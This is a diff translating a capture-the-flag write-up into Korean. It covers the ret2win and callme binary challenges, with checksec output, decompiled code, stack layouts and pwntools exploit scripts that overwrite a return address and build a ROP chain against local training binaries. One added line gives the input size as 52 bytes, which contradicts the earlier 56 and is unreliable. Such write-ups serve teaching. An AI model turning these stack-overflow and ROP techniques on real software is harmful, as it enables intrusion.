@@ -15,7 +15,7 @@ authors:
 
 ## ret2win
 
-### Binary Info
+### 바이너리 정보
 
 ```
 checksec --file ret2win
@@ -27,9 +27,9 @@ checksec --file ret2win
     PIE:      No PIE (0x400000)
 ```
 
-NX is enabled, so shellcode on the stack won't execute. No PIE means addresses are fixed. No canary means no stack protection.
+NX가 활성화되어 있어 스택에 셸코드를 넣어 실행할 수 없다. PIE가 없으므로 주소가 고정된다. 카나리도 없어 스택 보호가 없다.
 
-### Source Analysis
+### 소스 분석
 
 ```c
 int ret2win()
@@ -62,9 +62,11 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-`pwnme` reads up to 56 bytes into a 32-byte buffer. The `ret2win` function prints the flag when called. Since there's no canary and no PIE, overwriting the return address with `ret2win`'s fixed address is straightforward.
+`pwnme`가 32바이트 버퍼에 최대 56바이트를 읽는다. `ret2win` 함수는 호출되면 flag를 출력한다. 카나리가 없고 PIE도 없으므로, 리턴 주소를 `ret2win`의 고정 주소로 덮어쓰기만 하면 된다.
 
-### Stack Layout
+read 함수가 52바이트만큼 입력받으니 pwnme 함수의 ret에 ret2win 함수 주소를 넣으면 끝날 것 같다.
+
+### 스택 레이아웃
 
 ```
 gef> x/40xg $rsp
@@ -78,9 +80,9 @@ gef> x/40xg $rsp
 buf[32] | SFP[8] | ret[8]
 ```
 
-40 bytes of padding to reach the return address, then `ret2win`'s address.
+리턴 주소까지 40바이트 패딩이 필요하고, 그 뒤에 `ret2win` 주소를 넣는다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 from pwn import *
@@ -102,14 +104,14 @@ p.interactive()
 
 ## callme
 
-### Source Analysis
+### 소스 분석
 
 ```c
 void __fastcall __noreturn callme_three(__int64 a1, __int64 a2, __int64 a3)
 {
   if ( a1 == 0xDEADBEEFDEADBEEF && a2 == 0xCAFEBABECAFEBABE && a3 == 0xD00DF00DD00DF00D )
   {
-    // reads key2.dat, XORs buffer, prints flag
+    // key2.dat 읽기, 버퍼 XOR, flag 출력
     puts(g_buf);
     exit(0);
   }
@@ -124,7 +126,7 @@ int __fastcall callme_two(__int64 a1, __int64 a2, __int64 a3)
     puts("Incorrect parameters");
     exit(1);
   }
-  // reads key1.dat, XORs first 16 bytes of g_buf
+  // key1.dat 읽기, g_buf 앞 16바이트 XOR
   return puts("callme_two() called correctly");
 }
 
@@ -135,7 +137,7 @@ int __fastcall callme_one(__int64 a1, __int64 a2, __int64 a3)
     puts("Incorrect parameters");
     exit(1);
   }
-  // reads encrypted_flag.dat into g_buf
+  // encrypted_flag.dat를 g_buf에 읽기
   return puts("callme_one() called correctly");
 }
 
@@ -151,21 +153,21 @@ int pwnme()
 }
 ```
 
-Three functions must be called **in order** — `callme_one`, then `callme_two`, then `callme_three` — each with identical arguments `(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)`. On x86-64, arguments are passed in registers `rdi`, `rsi`, `rdx`.
+세 함수를 **순서대로** — `callme_one`, `callme_two`, `callme_three` — 각각 동일한 인자 `(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)`와 함께 호출해야 한다. x86-64에서 인자는 `rdi`, `rsi`, `rdx` 레지스터로 전달된다.
 
-### Strategy
+### 전략
 
-The `pwnme` function reads up to 512 bytes — plenty of room for a full ROP chain. The plan:
+`pwnme` 함수가 최대 512바이트를 읽어 — 완전한 ROP 체인을 넣기에 충분하다. 계획:
 
-1. Find a `pop rdi; pop rsi; pop rdx; ret` gadget (or equivalent)
-2. Set all three argument registers before each call
-3. Chain: `gadget → args → callme_one → gadget → args → callme_two → gadget → args → callme_three`
+1. `pop rdi; pop rsi; pop rdx; ret` 가젯(또는 동등한 것)을 찾는다
+2. 각 호출 전에 세 인자 레지스터를 설정한다
+3. 체인: `가젯 → 인자 → callme_one → 가젯 → 인자 → callme_two → 가젯 → 인자 → callme_three`
 
 ```bash
 ROPgadget --binary callme | grep "pop rdi"
 ```
 
-### Exploit
+### 익스플로잇
 
 ```python
 from pwn import *
@@ -173,7 +175,7 @@ from pwn import *
 p = process("./callme")
 elf = ELF("./callme")
 
-# ROP gadget: pop rdi; pop rsi; pop rdx; ret
+# ROP 가젯: pop rdi; pop rsi; pop rdx; ret
 pop_rdi_rsi_rdx = 0x0000000000401ab0
 
 callme_one   = elf.sym['callme_one']
@@ -202,4 +204,4 @@ p.sendline(payload)
 p.interactive()
 ```
 
-The key insight is that x86-64 passes the first three arguments via `rdi`, `rsi`, `rdx` respectively. Each function call in the chain requires setting those registers first using a single pop gadget, then calling the target function.
+핵심은 x86-64에서 처음 세 인자가 각각 `rdi`, `rsi`, `rdx`를 통해 전달된다는 것이다. 체인의 각 함수 호출은 단일 pop 가젯으로 해당 레지스터들을 먼저 설정한 후 목표 함수를 호출한다.
